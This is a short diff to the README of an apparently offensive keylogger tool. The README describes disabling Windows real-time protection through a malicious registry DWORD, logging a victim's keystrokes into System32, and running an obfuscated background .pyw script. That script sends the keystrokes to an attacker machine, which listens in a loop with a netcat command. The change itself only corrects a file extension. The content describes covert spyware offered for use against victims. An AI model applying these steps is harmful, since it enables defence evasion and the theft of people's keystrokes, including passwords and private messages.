@@ -4,7 +4,7 @@ A creative way to evade 'Real time protection' and 'Windows Firewall' on windows
 2. enject a malicious DWORD on the registry will will make the real time protection going down upon a reboot.
 3. Disable the real time protection.
 4. Save keystrokes on the C:\Windows\System32 directory and obtain it using a python to open a server on the victim machine.
-5. When the the SockLogger-Obfuscate.psy get execute [ Using .pyw for making it run in the background ], it's send the keystrokes of the victim to a remote machine [ Attacker ] on the other side by using the next command for listening in a loop: 'while true; do nc -lvnp [PORT]; done' [ in my case is PORT 8080 ].
+5. When the the SockLogger-Obfuscate.pyw gets execute [ Using .pyw for making it run in the background ], it's send the keystrokes of the victim to a remote machine [ Attacker ] on the other side by using the next command for listening in a loop: 'while true; do nc -lvnp [PORT]; done' [ in my case is PORT 8080 ].
 
 ![1](https://user-images.githubusercontent.com/90532971/196167464-4af42a03-e099-4c1f-ac87-d8f5b1b7dd4f.png)
 
